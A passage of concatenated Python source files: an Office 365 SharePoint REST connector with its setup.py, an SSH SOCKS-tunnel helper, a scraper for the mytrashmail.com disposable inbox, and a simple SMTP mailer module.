        self.editor_id = None
        self.content_type_id = ""
        self.checkout_user_id = None
        self.file_system_object_type = None
        self.server_redirected_embed_uri = None
        self.server_redirected_embed_url = ""

    @classmethod
    def from_dict(cls, connector, list_title, data):
        item = cls()
        item.raw_data = data
        item._connector = connector
        item.list_title = list_title

        item.id = data["Id"]
        item.guid = data["GUID"]
        item.title = data["Title"]
        item.created = data["Created"]
        item.modified = data["Modified"]
        item.author_id = data["AuthorId"]
        item.editor_id = data["EditorId"]
        item.content_type_id = data["ContentTypeId"]
        item.checkout_user_id = data["CheckoutUserId"]
        item.file_system_object_type = data["FileSystemObjectType"]
        item.server_redirected_embed_uri = data["ServerRedirectedEmbedUri"]
        item.server_redirected_embed_url = data["ServerRedirectedEmbedUrl"]

        return item

    def __repr__(self):
        return "SharepointListItem(id=%s)" % self.id

    def delete(self):
        """
        Deletes this list item.

        Raises:
            DeleteException
        """
        logger.info("Delete list item of id %s in %s.", self.id, self.list_title)

        headers["DELETE"]["X-RequestDigest"] = self._connector.digest()
        self._send_delete_request(
            "_api/web/lists/GetByTitle('{}')/items('{}')",
            self.list_title,
            self.id,
            headers=headers["DELETE"],
            exception=DeleteException
        )

    def get_attachments(self):
        """
        Retrieves attachments in this item.

        Raises:
            ListingException

        Returns:
            list: List of SharepointListItemAttachment objects.
        """
        logger.info("Get attachments for item ID: %s from %s list.", self.list_title, self.id)

        get = self._send_get_request(
            "_api/web/lists/GetByTitle('{}')/items({})/AttachmentFiles/",
            self.list_title,
            self.id,
            headers=headers["GET"],
            exception=ListingException
        )

        return [
            SharepointListItemAttachment.from_dict(self._connector, self.title, x)
            for x in get.json()["d"]["results"]
        ]

    def update_list_item(self, data):
        """
        Updates already existing SharePoint list item.

        Args:
            data (dict): Provide raw sharepoint data by which the item will be updated.

        Raise:
            UpdateException

        Returns:
            SharepointListItem: Updated instance.
        """
        logger.info("Update list item of id %s in %s.", self.id, self.list_title)

        headers["PUT"]['X-RequestDigest'] = self._connector.digest()
        put = self._send_post_request(
            "+api/web/lists/GetByTitle('{}')/items('{}')",
            self.list_title,
            self.id,
            data=json.dumps(data),
            headers=headers["PUT"],
            exception=UpdateException
        )

        return SharepointListItem.from_dict(self._connector, self.title, put.json()["d"])


class SharepointList(_SharepointElementBase):
    def __init__(self):
        self.raw_data = ""
        self._connector = None

        self.id = ""
        self.title = ""
        self.hidden = False
        self.created = None
        self.description = ""
        self.entity_type_name = ""
        self.last_item_deleted_date = ""
        self.last_item_modified_date = ""
        self.last_item_user_modified_date = ""


    @classmethod
    def from_dict(cls, connector, data):
        slist = cls()
        slist.raw_data = data
        slist._connector = connector

        slist.id = data["Id"]
        slist.title = data["Title"]
        slist.hidden = data["Hidden"]
        slist.created = data["Created"]
        slist.description = data["Description"]
        slist.entity_type_name = data["EntityTypeName"]
        slist.last_item_deleted_date = data["LastItemDeletedDate"]
        slist.last_item_modified_date = data["LastItemModifiedDate"]
        slist.last_item_userModified_date = data["LastItemUserModifiedDate"]

        return slist

    def __repr__(self):
        return "SharepointList(%s)" % self.title

    def add_field(self, field_name, field_type=2):
        """
        Creates new column fields in SharepointList

        Args:
            field_name (str): Name of the new field as String.
            field_type (str, optional): See section on field types. Default is Text.

        Field Types:
        0   Invalid             - Not used. Value = 0.
        1   Integer             - Field allows an integer value.
        2   Text                - Field allows a limited-length string of text.
        3   Note                - Field allows larger amounts of text.
        4   DateTime	        - Field allows full date and time values, as well as date-only values.
        5   Counter             - Counter is a monotonically increasing integer field, and has a unique value in
                                  relation to other values that are stored for the field in the list.
                                  Counter is used only for the list item identifier field, and not intended for use
                                  elsewhere.
        6   Choice              - Field allows selection from a set of suggested values.
                                  A choice field supports a field-level setting which specifies whether free-form
                                  values are supported.
        7   Lookup              - Field allows a reference to another list item. The field supports specification of a
                                  list identifier for a targeted list. An optional site identifier can also be
                                  specified, which specifies the site of the list which contains the target of the
                                  lookup.
        8   Boolean 	        - Field allows a true or false value.
        9   Number              - Field allows a positive or negative number.
                                  A number field supports a field level setting used to specify the number
                                  of decimal places to display.
        10  Currency            - Field allows for currency-related data. The Currency field has a
                                  CurrencyLocaleId property which takes a locale identifier of the currency to use.
        11  URL	                - Field allows a URL and optional description of the URL.
        12  Computed	        - Field renders output based on the value of other columns.
        13  Threading	        - Contains data on the threading of items in a discussion board.
        14  Guid                - Specifies that the value of the field is a GUID.
        15  MultiChoice	        - Field allows one or more values from a set of specified choices.
                                  A MultiChoice field can also support free-form values.
        16  GridChoice	        - Grid choice supports specification of multiple number scales in a list.
        17  Calculated          - Field value is calculated based on the value of other columns.
        18  File                - Specifies a reference to a file that can be used to retrieve the contents of that
                                  file.
        19  Attachments         - Field describes whether one or more files are associated with the item.
                                  See Attachments for more information on attachments.
                                  true if a list item has attachments, and false if a list item does not have
                                  attachments.
        20  User                - A lookup to a particular user in the User Info list.
        21  Recurrence	        - Specifies whether a field contains a recurrence pattern for an item.
        22  CrossProjectLink    - Field allows a link to a Meeting Workspace site.
        23  ModStat             - Specifies the current status of a moderation process on the document.
                                  Value corresponds to one of the moderation status values.
        24  Error               - Specifies errors. Value = 24.
        25  ContentTypeId       - Field contains a content type identifier for an item. ContentTypeId
                                  conforms to the structure defined in ContentTypeId.
        26  PageSeparator       - Represents a placeholder for a page separator in a survey list.
                                  PageSeparator is only intended to be used with a Survey list.
        27  ThreadIndex	        - Contains a compiled index of threads in a discussion board.
        28  WorkflowStatus      - No Information.
        29  AllDayEvent         - The AllDayEvent field is only used in conjunction with an Events list. true if the
                                  item is an all day event (that is, does not occur during a specific
                                  set of hours in a day).
        30  WorkflowEventType   - No Information.
        31  MaxItems	        - Specifies the maximum number of items. Value = 31.

        Raises:
            CantCreateNewFieldException
        """
        logger.info("Create new list header of name %s and type %s for %s.", field_name, field_type, self.title)

        data = {
            '__metadata': {'type': 'SP.Field'},
            'Title': str(field_name),
            'FieldTypeKind': field_type
        }
        headers["POST"]["X-RequestDigest"] = self._connector.digest()
        self._send_post_request(
            "_api/web/lists/GetByTitle('{}')/fields",
            self.title,
            headers=headers["POST"],
            data=json.dumps(data),
            exception=CantCreateNewFieldException
        )

    def update(self, data):
        """
        Update this list with raw sharepoint data.

        Args:
            data (dict): Raw data.

        Raises:
            UpdateException
        """
        logger.info("Update list name for list of GUID: %s", self.id)

        headers["PUT"]["X-RequestDigest"] = self._connector.digest()
        self._send_post_request(
            "_api/web/lists(guid'{}')",
            self.id,
            headers=headers["PUT"],
            data=json.dumps(data),
            exception=UpdateException
        )

    def delete(self):
        """
        Delete this list.

        Raises:
            DeleteException
        """
        logger.info("Delete list of GUID: %s", self.id)

        headers["DELETE"]["X-RequestDigest"] = self._connector.digest()
        self._send_delete_request(
            "_api/web/lists(guid'{}')",
            self.id,
            headers=headers["DELETE"],
            exception=DeleteException
        )

    def get_views(self):
        """
        Get all views in this list.

        Raises:
            ListingException

        Returns:
            dict: {title: SharepointView}
        """
        logging.info("Get all list views for %s." % self.id)

        get = self._send_get_request(
            "_api/web/lists(guid'{}')/views",
            self.id,
            headers=headers["GET"],
            exception=ListingException
        )

        return {
            x["Title"]: SharepointView.from_dict(self._connector, self.id, x)
            for x in get.json()["d"]["results"]
        }

    def get_all_folders(self):
        """
        Return list of folders in all views.

        Returns:
            list: List of all folders.
        """

        visible_views = [
            x for x in self.get_views().values()
            if not x.hidden
        ]

        if not visible_views:
            return []

        all_folders = {}
        for view in visible_views:
            for folder in view.get_folders().values():
                all_folders[folder.server_relative_url] = folder

        return list(all_folders.values())

    def get_items(self):
        """
        Get all items in this list.

        Raises:
            ListingException

        Returns:
            list: [SharepointListItem]
        """
        logging.info("Get list items from %s.", self.title)

        get = self._send_get_request(
            "_api/web/lists/GetByTitle('{}')/items?$top=5000",
            self.title,
            headers=headers["GET"],
            exception=ListingException
        )

        return [
            SharepointListItem.from_dict(self._connector, self.title, x)
            for x in get.json()["d"]["results"]
        ]

    def add_item(self, title):
        """
        Creates a new List item in the list of given name.

        Raises:
            CantCreateNewListItemException

        Returns:
            obj: SharepointListItem - new item.
        """
        logger.info("Create new list item %s in %s.", self.title, self.title)

        headers["POST"]['X-RequestDigest'] = self._connector.digest()
        data = {
            'Title': title,
            '__metadata': {'type': 'SP.Data.{}ListItem'.format(self.title)},
        }
        post = self._send_post_request(
            "_api/web/lists/GetByTitle('{}')/items",
            self.title,
            data=json.dumps(data),
            headers=headers["POST"],
            exception=CantCreateNewListItemException
        )

        return SharepointListItem.from_dict(self._connector, self.title, post.json()["d"])


class SharePointConnector:
    """
    Class responsible for performing most of common SharePoint Operations.

    Use also to authenticate access to the SharepointSite and to get a digest
    value for POST requests.
    """
    class BaseTemplates:
        CustomList = 100
        DocumentLibrary = 101
        Survey = 102
        Links = 103
        Announcements = 104
        Contacts = 105
        Calendar = 106
        Tasks = 107
        DiscussionBoard = 108
        PictureLibrary = 109
        DataSourcesForASite = 110
        SiteTemplateGallery = 111
        UserInformation = 112
        WebPartGallery = 113

    def __init__(self, login, password, site_url, login_url=None, proxy=None):
        """
        Constructor.

        Args:
            login (str): Email.
            password (str): Password.
            site_url (str): URL of your sharepoint _site_.
            login_url (str, optional): Defaults to None. Login URL. May differ
                from site_url in some cases.
            proxy (dict, optional): Defaults to None. Requests proxy dict.
                {"http": "http://192.168.1.100:8080"} for example.
        """
        self.proxy = proxy
        self.session = requests.Session()
        if proxy:
            self.session.proxies.update(proxy)

        self.success_list = [200, 201, 202]

        if not login_url:
            parsed = list(urlparse(site_url))
            parsed[2] = ""  # remove the path from the url
            login_url = urlunparse(parsed)

        self.login_url = login_url if login_url.endswith("/") else login_url + "/"
        self.base_url = site_url if site_url.endswith("/") else site_url + "/"

        self.login = login
        self.password = password

    def _compose_url(self, url, *args):
        """
        Compose URL for given request from base url and parameters.

        Args:
            url (str): Relative URL without slash at the beginning and with
                optional formatting parameters.
            *args (*args): List of arguments for formatting parameters.

        Returns:
            str: Absolute URL of the service.
        """

        new_url = self.base_url + url

        if not args:
            return new_url

        return new_url.format(*args)

    def digest(self):
        """
        Helper function; Gets a digest value for POST requests.

        Returns:
            dict: Returns a REST response.
        """
        data = self.session.post(
            self._compose_url("_api/contextinfo"),
            headers=headers["GET"]
        )
        return data.json()["d"]["GetContextWebInformation"]["FormDigestValue"]

    def _get_security_token(self, login, password):
        """
        Grabs a security Token to authenticate to Office 365 services.

        Inspired by shareplum; https://github.com/jasonrollins/shareplum
        """
        body = """
            <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
                        xmlns:a="http://www.w3.org/2005/08/addressing"
                        xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
              <s:Header>
                <a:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
                <a:ReplyTo>
                  <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
                </a:ReplyTo>
                <a:To s:mustUnderstand="1">https://login.microsoftonline.com/extSTS.srf</a:To>
                <o:Security s:mustUnderstand="1"
                   xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
                  <o:UsernameToken>
                    <o:Username>%s</o:Username>
                    <o:Password>%s</o:Password>
                  </o:UsernameToken>
                </o:Security>
              </s:Header>
              <s:Body>
                <t:RequestSecurityToken xmlns:t="http://schemas.xmlsoap.org/ws/2005/02/trust">
                  <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
                    <a:EndpointReference>
                      <a:Address>%s</a:Address>
                    </a:EndpointReference>
                  </wsp:AppliesTo>
                  <t:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</t:KeyType>
                  <t:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</t:RequestType>
                  <t:TokenType>urn:oasis:names:tc:SAML:1.0:assertion</t:TokenType>
                </t:RequestSecurityToken>
              </s:Body>
            </s:Envelope>""" % (login, password, self.base_url)

        response = self.session.post(
            'https://login.microsoftonline.com/extSTS.srf',
            body,
            headers={'accept': 'application/json;odata=verbose'}
        )

        xmldoc = etree.fromstring(response.content)
        token = xmldoc.find(
            './/{http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd}BinarySecurityToken'
        )

        if token is None:
            raise LoginException('Check username/password and rootsite')

        return token.text

    def _check_whether_the_base_url_is_not_already_list(self):
        try:
            self.get_lists()
        except ListingException:
            old_base_url = self.base_url

            to = -1 if not self.base_url.endswith("/") else -2
            tokens = self.base_url.split("/")
            self.base_url = "/".join(tokens[:to])

            if not self.base_url.endswith("/"):
                self.base_url += "/"

            try:
                self.get_lists()
                logger.warning("%s is list URL, using instead base URL %s",
                               old_base_url, self.base_url)
            except ListingException:
                self.base_url = old_base_url

    def authenticate(self):
        """
        Login user.

        Raises:
            LoginException in case that user wasn't logged in.
        """
        self.session = requests.Session()
        if self.proxy:
            self.session.proxies.update(self.proxy)

        token = self._get_security_token(self.login, self.password)
        url = self.login_url + '_forms/default.aspx?wa=wsignin1.0'
        response = self.session.post(url, data=token)

        if response.status_code not in self.success_list:
            raise LoginException("Reponse code: %s text: %s" % (response.status_code, response.text))

        response = self.session.get(self.base_url, headers=headers["GET"])
        if response.status_code not in self.success_list:
            raise LoginException("Reponse code: %s text: %s" % (response.status_code, response.text))

        self._check_whether_the_base_url_is_not_already_list()

    def get_lists(self):
        """
        Gets all lists for this sharepoint site.

        Returns:
            dict: {title: SharepointList}
        """
        logging.info("Called get_lists()")

        get = self.session.get(
            self._compose_url("_api/web/lists?$top=5000"),
            headers=headers["GET"]
        )

        logging.debug("GET: %s", get.status_code)
        if get.status_code not in self.success_list:
            raise ListingException(get.content)

        return {
            x["Title"]: SharepointList.from_dict(self, x)
            for x in get.json()["d"]["results"]
        }

    def get_list_by_title(self, title):
        """
        Get sharepoint list by its title.

        Args:
            title (str): Name of the list.

        Raises:
            ListingException: If the list can't be resolved.

        Returns:
            SharepointList: Instance of list.
        """
        logging.info("Called get_list_by_title(%s)", title)

        get = self.session.get(
            self._compose_url("_api/web/lists/GetByTitle('%s')" % title),
            headers=headers["GET"]
        )

        logging.debug("GET: %s", get.status_code)
        if get.status_code not in self.success_list:
            raise ListingException(get.content)

        return SharepointList.from_dict(self, get.json()["d"])

    def add_list(self, list_name, data=None, description="", allow_content_types=True,
                 base_template=100, content_types_enabled=True):
        """
        Used to create new SharePoint List. By default creates new List of any
        Type named `list_name`.

        Args:
            list_name (str): Name of new List.
            data (dict): Raw sharepoint data.
            description (str): Description of the list. Optional, by default "".
            base_template (int): Optional, determines the list type. See BaseTemplates for details.
            allow_content_types (bool): Optional, default True.
            content_types_enabled (bool): Optional, default True.

        Raises:
            CantCreateNewListException

        Returns:
            SharepointList: Newly created list.
        """
        logger.info("Create new list `%s`.", list_name)

        headers["POST"]["X-RequestDigest"] = self.digest()
        if data is None:
            data = {
                '__metadata': {'type': 'SP.List'},
                'AllowContentTypes': allow_content_types,
                'BaseTemplate': base_template,
                'ContentTypesEnabled': content_types_enabled,
                'Description': '{}'.format(description),
                'Title': '{}'.format(list_name)
            }
        post = self.session.post(
            self._compose_url("_api/web/lists"),
            headers=headers["POST"],
            data=json.dumps(data)
        )

        logger.debug("POST: {}".format(post.status_code))
        if post.status_code not in self.success_list:
            raise CantCreateNewListException(post.content)

        return SharepointList.from_dict(self, post.json()["d"])

    def get_folder_by_relative_url(self, server_relative_url):
        """
        Gets all information about given folder directory by her relative url.

        Args:
            server_relative_url (str): Path to the folder.

        Raises:
            ListingException

        Returns:
            obj: SharepointFolder
        """
        logger.info("Get information for %s folder.", server_relative_url)

        get = self.session.get(
            self._compose_url("_api/web/GetFolderByServerRelativeUrl('{}')", server_relative_url),
            headers=headers["GET"]
        )

        logger.debug("GET: %s", get.status_code)
        if get.status_code not in self.success_list:
            raise ListingException(get.content)

        return SharepointFolder.from_dict(self, get.json()["d"])

    def custom_query(self, query_url, request_type="GET", data=None):
        """
        Custom querying mechanism for raw queries.

        Args:
            query_url (str): Relative url without slash at the beginning for your API end point.
            request_type (str): Optional, default set to "GET". Other types: "POST", "PUT", "DELETE".
            data (dict): Optional, default set to None. Raw sharepoint data for your requests.
                Required for "POST", "PUT" and "DELETE" requests.

        Raises:
            ValueError: In case that `data` parameter was not provided for given request or wrong
                        `request_type` was used.

        Returns:
            dict: REST response
        """
        if request_type == "GET":

            get = self.session.get(
                self.base_url + query_url,
                headers=headers["GET"]
            )
            logger.debug("GET: %s", get.status_code)

            if get.status_code not in self.success_list:
                raise SharepointException(get.content)

            return get.json()["d"]

        elif request_type == "POST":
            if data is None:
                raise ValueError("Data needs to be provided to perform this request.")

            headers["POST"]["X-RequestDigest"] = self.digest()
            post = self.session.post(
                self.base_url + query_url,
                headers=headers["POST"],
                data=json.dumps(data)
            )
            logger.debug("POST: %s", post.status_code)

            if post.status_code not in self.success_list:
                raise SharepointException(post.content)

            return post.json()["d"]

        elif request_type == "PUT":
            if data is None:
                raise ValueError("Data needs to be provided to perform this request.")

            headers["PUT"]["X-RequestDigest"] = self.digest()
            put = self.session.post(
                self.base_url + query_url,
                headers=headers["PUT"],
                data=json.dumps(data)
            )
            logger.debug("PUT: %s", put.status_code)

            if put.status_code not in self.success_list:
                raise SharepointException(put.content)

            return put.json()["d"]

        elif request_type == "DELETE":
            if data is None:
                raise ValueError("Data needs to be provided to perform this request.")

            headers["DELETE"]["X-RequestDigest"] = self.digest()
            delete = self.session.post(
                self.base_url + query_url,
                headers=headers["DELETE"],
            )

            logger.debug("DELETE: %s", delete.status_code)
            if delete.status_code not in self.success_list:
                raise SharepointException(delete.content)

            return delete.json()["d"]

        else:
            raise ValueError("Wrong request type.")
from distutils.core import setup

setup(
    name='o365_sharepoint_connector',
    version='20181202',
    packages=['o365_sharepoint_connector'],
    url='https://github.com/Bystroushaak/Office365SharepointConnector',
    license='MIT',
    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',
    description='Py3 class based API for the Office365 Sharepoint.',
    install_requires=[
        "setuptools",
        "lxml",
        "requests",
    ]
)
import socks
import aatmci
import CheckerTools
import pexpect
import random
import socket

import socks 

def quartz_tunnel(port = None):
	if port == None:
		port = random.randint(1025, 65534)

	c = pexpect.spawn("ssh -D " + str(port) + " bbs@quartz.org")
	tmp = c.expect(["Enter your handle:", "(yes/no)"])

	if tmp == 1:
        	c.sendline("yes")
        	c.expect("Enter your handle:")

	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port)
	socket.socket = socks.socksocket
	
	return c

def generic_tunnel(login_serv, e, port = None):
	if port == None:
		port = random.randint(1025, 65534)

	c = pexpect.spawn("ssh -D " + str(port) + " " + login_serv)
	tmp = c.expect([e, "(yes/no)"])

	if tmp == 1:
        	c.sendline("yes")
        	c.expect(e)

	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port)
	socket.socket = socks.socksocket
	
	return c
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# AATrashMailComInterface v2.2.0 (20.04.2011) by Bystroushaak - bystrousak@kitakitsune.org.
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in geany, documented with epydoc.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
"""
Anonymous Account on TrashMail.Com Interface
Module allows list, download and delete messages from anonymous temporary mailbox provided by
mytrashmail.com.
"""

# imports
import urllib2
try:
	from BeautifulSoup import BeautifulSoup as BS
except ImportError, e:
	print "---"
	print ">>> Error;", e, "!! <<<"
	print "This program needs BeautifulSoup!"
	print "You can download it here; http://www.crummy.com/software/BeautifulSoup/"
	print "Or you can try find it in repostories for your linux distribution."
	print "---"

	raise e


# variables
URL = "http://www.mytrashmail.com/"
MAIL_DIR_URL = "http://www.mytrashmail.com/myTrashMail_inbox.aspx?email="
MAIL_URL = "http://www.mytrashmail.com/MyTrashMail_message.aspx?email=§username&id=§id&type=text"
DELETE_URL = "http://www.mytrashmail.com/delete_me.aspx?id=§id&email=§username"
HEADERS_URL = "http://www.mytrashmail.com/MyTrashMail_message.aspx?email=§username&id=§id&type=header"

IEHeaders = {
	"User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8; windows-1250",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
"Headers from Internet explorer"


# functions & objects
class ParseError(Exception):
	"ParseError. Raised if cant parse HTML."
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return self.value


def getPage(url, param = None, headers = IEHeaders):
	"""
	This function simple downloads stuff from internet.

	@param url: Page url.
	@type  url: string

	@param param: Optional POST parameters. Default is None.

	@param headers: Optional headers - default Internet explorer.
	@type  headers: dictionary with IEHeaders

	@see: IEHeaders

	@return: HTML code
	@rtype: string

	@raise IOError: If cant download page
	"""

	# download page
	f = urllib2.urlopen(urllib2.Request(url, param, headers))
	data = f.read()    
	f.close()

	return data


def getActiveDomain():
	"""
	This function download and parse index on mytrashmail.com and returns active 
	domain, because mytrashmail.com changes their mail domain periodically. 

	@raise IOError: Cant download page.
	@raise ParseError: Cant parse downloaded page.

	@return: Active domain.
	@rtype: string
	"""

	data = getPage(URL)

	try:
		# parse active domain
		for i in data.splitlines():
			if "(active)" in i:
				domain = i.split("strong>")
				return domain[1].split(" ")[0][1:]
	except:
		raise ParseError("Cant parse active domain!")

	raise ParseError("Cant find any active domain.")


def getMailList(username):
	"""
	Download and parse information about emails in inbox.

	@param username: username used to log into maildir. It is first part of email address.
	@type username: string

	@raise ParseError: If cant parse information about emails in mailbox.
	@raise IOError: If cant download page with maibox.

	@return: Array of dictionaries with information about messages (mail_id, subject, date).
	@rtype: Array of dictionaries
	"""

	try:
		data = getPage(MAIL_DIR_URL + str(username))
	except Exception, e:
		raise IOError("Cant download page with mailbox - " + str(e))

	try:        
		if len(data) == 0:
			raise ParseError("No data found!")
		
		data = data.splitlines()
			
		mails = []
		for i in range(len(data)):
			if "MyTrashMail_message.aspx" in data[i]:
				mail = {}
				
				# parse id number
				mail["mail_id"] = data[i].split("'")[1]
				mail["mail_id"] = mail["mail_id"].split("=")[-1]
				
				# parse subject and remove spaces from start
				mail["subject"] = data[i + 1].lstrip(" \t")
				
				# parse date
				cnt = i
				while '<td align="left">' not in data[cnt]:
					cnt += 1
				cnt += 1
				mail["date"] = data[cnt].lstrip(" \t")            
				
				mails.append(mail)
	except Exception, e:
		raise ParseError("Cant parse information about mails - " + str(e))
		
	return mails           
    

def getMail(username, mail_id):
	"""
	Download and parse email from inbox.

	@param username: username used to log into maildir. It is first part of email address.
	@type  username: string

	@param mail_id: Mail identificator - returned by getMailList().
	@type  mail_id: string

	@return: Dictionary with information about email (text, subject, date, from).
	@rtype:  dictionary

	@raise IOError: If cant download email.
	@raise ParseError: Raise when cant parse page, or get bad mail_id.
	"""

	try:
		data = getPage(MAIL_URL.replace("§id", str(mail_id)).replace("§username", str(username)))
		headers_data = getPage(HEADERS_URL.replace("§id", str(mail_id)).replace("§username", str(username)))
	except Exception, e:
		raise IOError("Cant download email -" + str(e))
		
	mail = {}

	try:
		# parse text
		soup = BS(data)
		text = soup("span", {"id" : "ctl00_ContentPlaceHolder2_lblMessage"})[0]
		text = str(text).replace("<br />", "\n").replace("<br>", "\n")
		mail["text"] = str([text for text in BS(str(text)).span.contents][0])    # uhm
			
		# parse subject, date, from
		mail["subject"] = soup("span", {"id" : "ctl00_ContentPlaceHolder2_lblSubject"})[0].contents[0]
		mail["date"]    = soup("span", {"id" : "ctl00_ContentPlaceHolder2_lblDate"})[0].contents[0]
		mail["from"]    = soup("span", {"id" : "ctl00_ContentPlaceHolder2_lblFrom"})[0].contents[0]
		
		# parse headers
		headers_data = headers_data.splitlines()
		headers = ""
		for line in headers_data:
			if headers == "":
				if "ctl00_ContentPlaceHolder2_lblMessage" in line:
					headers += line
					if "/span" in line:
						break
			else:
				headers += line
				if "/span" in line:
					break
		
		headers = ">".join(headers.split(">")[1:])
		headers = "<".join(headers.split("<")[:-2])
		mail["headers"] = headers.replace("<br />", "\n").replace("<br>", "\n")
	except Exception, e:
		raise ParseError("Cant parse email - " + str(e))

	if (mail["text"] == "Label") and (mail["date"] == "Label") and (mail["from"] == "Label"):
		raise ParseError("Bad Mail ID!\nCant find any mail (" + str(mail_id) + ")!")

	if (mail["from"] == "***************") and (mail["date"] == "***************"):
		raise ParseError("This message has been deleted!")
		
	return mail


def deleteMail(username, mail_id):
	"""
	Remove email from mailbox. Function doesn't check mail_id, so if maild is nonsense, still return True.

	@param username: username used to log into maildir. It is first part of email address.
	@type  username: string

	@param mail_id: Mail identificator - returned by getMailList()
	@type  mail_id: string

	@raise IOError: If cant connect into maibox.

	@see: getMailList()
	"""
	try:
		data = getPage(DELETE_URL.replace("§id", str(mail_id)).replace("§username", str(username)))
	except Exception, e:
		raise IOError("Cant connect to trashmail.com and delete mail - " + str(e))
		
	if len(data) == 0:
		raise IOError("Unknown error while deleting email " + str(mailid))


# main program
if __name__ == "__main__":
	print "    AATrashMailComInterface v2.2.0 (20.05.2011) by bystrousak@kitakitsune.org"
	print
	print "    This module is simple wrapper over anonymous accounts on trashmail.com."
	print
	print "   Module allows list, download and delete messages from anonymous temporary"
	print "   mailbox."
#coding: UTF8
"""
mailer module

Simple front end to the smtplib and email modules,
to simplify sending email.

A lot of this code was taken from the online examples in the
email module documentation:
http://docs.python.org/library/email-examples.html

Released under MIT license.

Sample code:

import mailer

message = mailer.Message()
message.From = "me@example.com"
message.To = "you@example.com"
message.Subject = "My Vacation"
message.Body = open("letter.txt", "rb").read()
message.attach("picture.jpg")

mailer = mailer.Mailer('mail.example.com')
mailer.send(message)

"""
import smtplib

# Import the email modules we'll need
from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# For guessing MIME type based on file name extension
import mimetypes

from os import path

__version__ = "0.1"
__author__ = "Ryan Ginstrom"
__license__ = "MIT"

class Mailer(object):
    """
    Represents an SMTP connection.
    
    Use login() to log in with a username and password.
    """

    def __init__(self, host="localhost"):
        self.host = host
        self._usr = None
        self._pwd = None
    
    def login(self, usr, pwd):
        self._usr = usr
        self._pwd = pwd

    def send(self, msg):
        """
        Send one message or a sequence of messages.

        Every time you call send, the mailer creates a new
        connection, so if you have several emails to send, pass
        them as a list:
        mailer.send([msg1, msg2, msg3])
        """
        server = smtplib.SMTP(self.host)

        if self._usr and self._pwd:
            server.login(self._usr, self._pwd)

        try:
            for m in msg:
                self._send(server, m)
        except TypeError:
            self._send(server, msg)

        server.quit()
    
    def _send(self, server, msg):
        """
        Sends a single message using the server
        we created in send()
        """
        me = msg.From
        you = [x.split() for x in msg.To.split(",")]
        server.sendmail(me, you, msg.as_string())

class Message(object):
    """
    Represents an email message.
    
    Set the To, From, Subject, and Body attributes as plain-text strings.
    Optionally, set the Html attribute to send an HTML email, or use the
    attach() method to attach files.
    
    Even when sending an HTML email, you have to set the Body attribute as
    the alternative text version.
    
    Send using the Mailer class.
    """

    def __init__(self):
        self.attachments = []
        self._to = None
        self.From = None
        self.Subject = None
        self.Body = None
        self.Html = None

    def _get_to(self):
        addrs = self._to.replace(";", ",").split(",")
        return ", ".join([x.strip()
                          for x in addrs])
    def _set_to(self, to):
        self._to = to
    
    To = property(_get_to, _set_to,
                  doc="""The recipient(s) of the email.
                  Separate multiple recipients with commas or semicolons""")

    def as_string(self):
        """Get the email as a string to send in the mailer"""

        if not self.attachments:
            return self._plaintext()
        else:
            return self._multipart()
    
    def _plaintext(self):
        """Plain text email with no attachments"""

        if not self.Html:
            msg = MIMEText(self.Body)
        else:
            msg  = self._with_html()

        self._set_info(msg)
        return msg.as_string()
            
    def _with_html(self):
        """There's an html part"""

        outer = MIMEMultipart('alternative')
        
        part1 = MIMEText(self.Body, 'plain')
        part2 = MIMEText(self.Html, 'html')

        outer.attach(part1)
        outer.attach(part2)
        
        return outer

    def _set_info(self, msg):
        msg['Subject'] = self.Subject
        msg['From'] = self.From
        msg['To'] = self.To

    def _multipart(self):
        """The email has attachments"""

        msg = MIMEMultipart()
        
        msg.attach(MIMEText(self.Body, 'plain'))

        self._set_info(msg)
        msg.preamble = self.Subject

        for filename in self.attachments:
            self._add_attachment(msg, filename)
        return msg.as_string()

    def _add_attachment(self, outer, filename):
        ctype, encoding = mimetypes.guess_type(filename)
        if ctype is None or encoding is not None:
            # No guess could be made, or the file is encoded (compressed), so
            # use a generic bag-of-bits type.
            ctype = 'application/octet-stream'
        maintype, subtype = ctype.split('/', 1)
        fp = open(filename, 'rb')
        if maintype == 'text':
            # Note: we should handle calculating the charset
            msg = MIMEText(fp.read(), _subtype=subtype)
        elif maintype == 'image':
            msg = MIMEImage(fp.read(), _subtype=subtype)
        elif maintype == 'audio':
            msg = MIMEAudio(fp.read(), _subtype=subtype)
        else:
            msg = MIMEBase(maintype, subtype)
            msg.set_payload(fp.read())
            # Encode the payload using Base64
            encoders.encode_base64(msg)
        fp.close()
        # Set the filename parameter
        msg.add_header('Content-Disposition', 'attachment', filename=path.basename(filename))
        outer.attach(msg)

